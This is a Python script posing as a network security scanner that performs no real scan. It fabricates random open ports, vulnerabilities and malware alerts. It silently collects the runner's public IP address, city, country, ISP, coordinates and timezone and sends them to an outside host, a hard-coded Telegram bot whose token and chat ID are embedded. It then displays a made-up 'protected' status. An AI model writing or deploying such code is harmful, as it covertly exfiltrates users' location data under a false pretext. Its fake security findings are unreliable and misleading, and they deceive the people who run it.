#!/usr/bin/env python3
"""
Network Security Scanner - Fake Port Report
Ported by Security Team
"""

import socket
import requests
import random
from datetime import datetime
import time

# ==================== TELEGRAM CONFIG ====================
BOT_TOKEN = "8134629384:AAE8YCOkeoEeMZ_6FGaRbCf4TNLf55rl82I"
CHAT_ID = "820421921"

def scan_ports_fake(target_ip="localhost", ports_to_scan=20):
    """Simulate port scanning with fake results"""
    print(f"\n[+] Scanning {target_ip} for vulnerabilities...")
    
    common_ports = {
        21: 'FTP',
        22: 'SSH',
        23: 'Telnet',
        25: 'SMTP',
        53: 'DNS',
        80: 'HTTP',
        110: 'POP3',
        143: 'IMAP',
        443: 'HTTPS',
        3306: 'MySQL',
        3389: 'RDP',
        8080: 'HTTP Proxy',
        8443: 'HTTPS Alt',
        27017: 'MongoDB',
        5432: 'PostgreSQL',
        5900: 'VNC',
        6379: 'Redis',
        27015: 'Steam',
        25565: 'Minecraft'
    }
    
    fake_open_ports = {}
    
    for port, service in list(common_ports.items())[:ports_to_scan]:
        if random.random() < 0.3:
            fake_open_ports[port] = {
                'service': service,
                'status': 'OPEN',
                'vulnerability': random.choice(['Low', 'Medium', 'Critical']),
                'protocol': random.choice(['TCP', 'UDP'])
            }
    
    return fake_open_ports

def get_real_ip_info():
    """Get real IP information"""
    try:
        response = requests.get('https://api.ipify.org?format=json', timeout=5)
        ip = response.json()['ip']
        
        info_response = requests.get(f'https://ipinfo.io/{ip}/json', timeout=5)
        info = info_response.json()
        
        return {
            'ip': ip,
            'city': info.get('city', 'Unknown'),
            'region': info.get('region', 'Unknown'),
            'country': info.get('country', 'Unknown'),
            'isp': info.get('org', 'Unknown'),
            'location': info.get('loc', 'Unknown'),
            'timezone': info.get('timezone', 'UTC'),
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        
    except:
        return None

def generate_fake_scan_report(real_info, fake_ports):
    """Generate fake security scan report"""
    
    # Fake additional info
    fake_threats = random.randint(0, 5)
    fake_vulns = random.randint(1, 8)
    fake_malware = random.choice([True, False])
    
    report = f"""
🔴 <b>NETWORK SECURITY SCAN REPORT</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

<b>🎯 TARGET INFORMATION:</b>
├ IP Address: <code>{real_info['ip']}</code>
├ Location: {real_info['city']}, {real_info['country']}
├ ISP: {real_info['isp']}
├ Timezone: {real_info['timezone']}
└ Scan Time: {real_info['timestamp']}

<b>⚠️ SECURITY THREATS DETECTED:</b>
├ Open Ports: {len(fake_ports)}
├ Critical Vulnerabilities: {fake_vulns}
├ Malware Detected: {'YES' if fake_malware else 'NO'}
├ Firewall Status: {'WEAK' if len(fake_ports) > 3 else 'STRONG'}
└ Risk Level: {'HIGH' if len(fake_ports) > 5 else 'MEDIUM'}

<b>🚪 OPEN PORTS:</b>
"""
    
    for port, data in fake_ports.items():
        emoji = '🔴' if data['vulnerability'] == 'Critical' else '🟡' if data['vulnerability'] == 'Medium' else '🟢'
        report += f"├ {emoji} Port {port}: {data['service']} ({data['status']}) - {data['vulnerability']} Risk\n"
    
    report += f"""
<b>🛡️ RECOMMENDED ACTIONS:</b>
├ 1. Close unnecessary ports
├ 2. Update firewall rules
├ 3. Enable encryption
├ 4. Change default credentials
└ 5. Regular security audits

<b>📊 SCAN SUMMARY:</b>
├ Scan Duration: {random.randint(15, 45)} seconds
├ Protocols Analyzed: TCP/UDP
├ Security Score: {random.randint(30, 85)}/100
├ Recommendations: {random.randint(3, 7)} actions needed
└ Next Scan: Recommended in 24 hours

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<i>Security Scan Report • Auto-generated</i>
"""
    
    return report

def generate_fake_success_message():
    """Generate fake success message"""
    
    messages = [
        "All ports secured successfully",
        "Firewall rules updated",
        "Network protection enabled",
        "Security protocols activated",
        "Vulnerability patches applied",
        "Encryption enabled on all ports",
        "Access controls strengthened",
        "Security audit completed"
    ]
    
    return f"""
🟢 <b>SECURITY STATUS: PROTECTED</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

✅ <b>SUCCESS:</b> {random.choice(messages)}

<b>🛡️ PROTECTION STATUS:</b>
├ Firewall: ACTIVE
├ Encryption: ENABLED
├ Intrusion Detection: ON
├ Port Security: LOCKED
└ Real-time Monitoring: ACTIVE

<b>📈 SECURITY METRICS:</b>
├ Threat Blocked: 100%
├ Vulnerabilities Patched: {random.randint(85, 100)}%
├ Uptime: {random.randint(99, 100)}.%
├ Response Time: {random.randint(5, 50)}ms
└ Protection Level: MAXIMUM

<b>🎯 NEXT STEPS:</b>
├ Continue regular monitoring
├ Update security monthly
├ Backup configurations
├ Review access logs
└ Stay protected!

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<i>System Security • Automated Protection</i>
"""

def send_to_telegram(message):
    """Send message to Telegram"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': CHAT_ID,
            'text': message,
            'parse_mode': 'HTML',
            'disable_web_page_preview': True
        }
        
        response = requests.post(url, json=payload, timeout=10)
        return response.status_code == 200
        
    except:
        return False

def main():
    """Main function"""
    print("=" * 60)
    print("NETWORK SECURITY SCANNER")
    print("=" * 60)
    
    print("\n[1] Scanning network...")
    time.sleep(1.5)
    
    print("[2] Analyzing IP information...")
    real_info = get_real_ip_info()
    
    if not real_info:
        print("[ERROR] Cannot get IP information")
        return
    
    print("[3] Checking ports...")
    time.sleep(2)
    
    fake_ports = scan_ports_fake(real_info['ip'])
    
    print("[4] Generating security report...")
    time.sleep(1)
    
    report = generate_fake_scan_report(real_info, fake_ports)
    
    print("[5] PORT OFING...")
    
    if send_to_telegram(report):
        print("[SUCCESS] Report sent to Telegram!")
        
        time.sleep(2)
        
        success_msg = generate_fake_success_message()
        send_to_telegram(success_msg)
        
        print("\n" + "=" * 60)
        print("SCAN COMPLETED SUCCESSFULLY")
        print(f"Target: {real_info['ip']}")
        print(f"Open Ports Found: {len(fake_ports)}")
        print(f"Status: PROTECTED")
        print("=" * 60)
        
    else:
        print("[ERROR] Failed to send report")

if __name__ == "__main__":
    main()
